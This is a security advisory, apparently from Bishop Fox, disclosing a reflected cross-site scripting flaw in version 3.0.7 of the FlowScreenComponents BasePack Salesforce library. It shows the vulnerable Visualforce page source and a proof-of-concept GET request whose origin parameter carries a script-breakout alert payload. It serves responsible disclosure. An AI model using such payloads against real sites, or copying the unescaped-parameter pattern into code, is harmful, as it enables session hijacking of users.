---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2022-12-15_flowscreencomponents-basepack-version-307-advisory.md
original_filename: 2022-12-15_flowscreencomponents-basepack-version-307-advisory.md
title: FlowscreenComponents Basepack, Version 3.0.7 Advisory
category: documents
detected_topics:
- xss
- command-injection
- information-disclosure
- api-security
- supply-chain
tags:
- imported
- documents
- xss
- command-injection
- information-disclosure
- api-security
- supply-chain
language: en
raw_sha256: 9f8eadb826d77fc55abca2fdbfca794eaba7e84f5da6df15e0794b4dddad09ba
text_sha256: 23316ec42f7cca86000c1e76568b28ad261324d4898adcbed067bec2877633a5
ingested_at: '2026-06-28T07:32:16Z'
sensitivity: unknown
redactions_applied: false
---

# FlowscreenComponents Basepack, Version 3.0.7 Advisory

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2022-12-15_flowscreencomponents-basepack-version-307-advisory.md
- Source Type: markdown
- Detected Topics: xss, command-injection, information-disclosure, api-security, supply-chain
- Ingested At: 2026-06-28T07:32:16Z
- Redactions Applied: False
- Raw SHA256: `9f8eadb826d77fc55abca2fdbfca794eaba7e84f5da6df15e0794b4dddad09ba`
- Text SHA256: `23316ec42f7cca86000c1e76568b28ad261324d4898adcbed067bec2877633a5`


## Content

---
title: "FlowscreenComponents Basepack, Version 3.0.7 Advisory"
page_title: "FlowscreenComponents Basepack, Version 3.0.7 Advisory | Bishop Fox"
url: "https://bishopfox.com/blog/flowscreencomponents-advisory"
final_url: "https://bishopfox.com/blog/flowscreencomponents-advisory"
authors: ["Matthew Rutledge"]
programs: ["UnofficialSF"]
bugs: ["XSS", "Security code review"]
publication_date: "2022-12-15"
added_date: "2022-12-15"
source: "pentester.land/writeups.json"
original_index: 1774
---

Share

[ ](https://www.facebook.com/share.php?u=https://bishopfox.com/blog/flowscreencomponents-advisory&amp;utm_medium=social&amp;utm_source=facebook) [ ](https://twitter.com/intent/tweet?url=https://bishopfox.com/blog/flowscreencomponents-advisory&utm_medium=social&utm_source=twitter&source=tweetbutton&text=) [ ](http://www.linkedin.com/shareArticle?mini=true&url=https://bishopfox.com/blog/flowscreencomponents-advisory&utm_medium=social&utm_source=linkedin) [ ](/feeds/advisories.rss)

## FlowscreenComponents Basepack, Version 3.0.7 Advisory

The following document describes identified vulnerabilities in the FlowScreenComponents BasePack library version 3.0.7.

### Product Vendor

UnofficialSF

### Product Description

FlowScreenComponents BasePack is a library that helps developers build their own Salesforce screen components. The project’s official website is [UnofficialSF](https://unofficialsf.com/). The latest version of the library is 3.0.14, released on September 18, 2022.

### Vulnerabilities List

One vulnerability was identified within the FlowScreenComponents BasePack library:

  * Cross-site Scripting (XSS)

### Affected Version

Version 3.0.7

### Summary of Findings

A reflected cross-site scripting vulnerability was identified in a page created by the FlowScreenComponents BasePack library. This vulnerability could be used to execute JavaScript in the context of the affected Salesforce domain.

### Impact

An attacker could exploit this vulnerability to perform actions in the context of the affected users. The impact of this vulnerability includes taking over targeted users’ sessions. Additional impact depends on the functionality of the affected application.

### Solution

Restrict user access to the page with the vulnerability until an updated version of the library without the vulnerability is released.

## Vulnerabilities

### Cross-site Scripting (XSS)

The FlowScreenComponents BasePack library created a page that contained a reflected cross-site scripting (XSS) vulnerability. The vulnerability allowed the execution of a JavaScript payload in the context of the affected Salesforce domain. The vulnerability could be exploited to steal a targeted user’s session.

### Vulnerability Details 

Vulnerability Type: Cross-site scripting (XSS) 

Access Vector: ☒ Remote, ☐ Local, ☒ Physical, ☐ Context dependent, ☐ Other (if other, please specify)

Impact: ☐ Code execution, ☐ Denial of service, ☒ Escalation of privileges, ☐ Information disclosure, ☐ Other (if other, please specify)

Security Risk: ☐ Critical, ☐ High, ☒ Medium, ☐ Low

Vulnerability: CWE-79

A reflected XSS vulnerability was found in the FlowScreenComponents BasePack library that allowed JavaScript code to be executed in the context of the affected Salesforce domain. An attacker could exploit this issue to perform actions in the context of the affected user. The vulnerability was found in the origin, params, and flowname parameters of the following endpoint:
  
  
  https://[REDACTED].force.com/fsc_screenFlow

The vulnerability can be found on lines 14, 15, and 22 of the endpoint’s source code shown below:  

  
  
  <apex:page id="fsc_screenFlow" showHeader="false" sidebar="false" lightningStylesheets="true">
  <html>
  <head>
  <apex:includeLightning />
  </head>
  <body class="slds-scope">
  <div id="fsc_screenFlow"/>
  <script>
  let statusChange = function (event) {
  console.log('statusChange');
  parent.postMessage({
  flowStatus: event.getParam("status"),
  flowParams: event.getParam("outputVariables"),
  flowOrigin: "{!$CurrentPage.parameters.origin}"
  }, "{!$CurrentPage.parameters.origin}");
  };
  $Lightning.use("c:fsc_screenFlowApp", function () {
  // Create the flow component and set the onstatuschange attribute
  $Lightning.createComponent("lightning:flow", {"onstatuschange": statusChange},
  "fsc_screenFlow",
  function (component) {
  component.startFlow("{!$CurrentPage.parameters.flowname}", {!$CurrentPage.parameters.params});
  }
  );
  });
  </script>
  </body>
  </html>
  </apex:page>

To demonstrate this vulnerability, the following HTTP GET request containing a JavaScript payload in the `origin` parameter was sent while authenticated as a valid user:

**Request:**
  
  
  GET 
  /fsc_screenFlow?origin=%3C/script%3E%3Cscript%3Ealert(document.location)%3C/script%3E 
  HTTP/1.1
  Host: [REDACTED].force.com
  Cookie: sid=[REDACTED]

**Response:**
  
  
  HTTP/1.1 200 OK
  …omitted for brevity…
  console.log('statusChange');
  parent.postMessage({
  flowStatus: event.getParam("status"),
  flowParams: event.getParam("outputVariables"),
  flowOrigin: "</script><script>alert(window.origin)</script>"
  }, "</script><script>alert(window.origin)</script>");
  };
  $Lightning.use("c:fsc_screenFlowApp", function () {
  …omitted for brevity…

When the HTTP response was interpreted by a browser, it created an alert box that displayed the origin under which the payload was executed, as shown below:

******  
**

![FIGURE 2 - Payload execution in browser](https://assets.bishopfox.com/prod-1437/Images/channels/blog/Content/Flowstack-Figure-Two.PNG)

**FIGURE 1** \- Payload execution in browser

As the XSS payload was executed within the same origin as the web application, the vulnerability could be used to interact with the web application and perform actions that a legitimate user would.

### Credits

  * Matthew Rutledge, Security Consultant, Bishop Fox ([[email protected]](/cdn-cgi/l/email-protection#94f9e6e1e0f8f1f0f3f1d4f6fde7fcfbe4f2fbecbaf7fbf9))

### Timeline

  * 06/13/2022: Initial discovery
  * 08/02/2022 - Attempted to contact the vendor via email
  * 09/06/2022 - Opened GitHub issue asking for contact information
  * 09/18/2022 - Vendor replied with their preferred contact method to receive the vulnerability report
  * 09/21/2022 - Vulnerability report sent to preferred contact method
  * 10/31/2022 - 90-day disclosure deadline reached
  * 12/15/2022 : Vulnerability publicly disclosed  

* * *

![Default fox headshot purple](https://assets.bishopfox.com/prod-1437/Images/headshots/BanksyFox_exploder2.png)

By Matthew Rutledge 

Security Consultant

Matthew Rutledge ([OSCP](https://www.offensive-security.com/pwk-oscp/)) is a Security Consultant at Bishop Fox, where he focuses on [web application](https://bishopfox.com/services/penetration-testing-services/application-penetration-testing) assessments. Matthew holds a B.S. degree in Computer Science and a M.S. in Cybersecurity. Matthew has carried out penetration testing engagements for Fortune 100 companies across several industries including healthcare, technology, and manufacturing.

[ More by Matthew Rutledge  ](https://bishopfox.com/authors/matthew-rutledge)

![](/static/assets/images/backgrounds/lander-header-bg-black-lines.svg)

Subscribe to our blog

Be first to learn about latest tools, advisories, and findings.

Thank You! You have been subscribed.
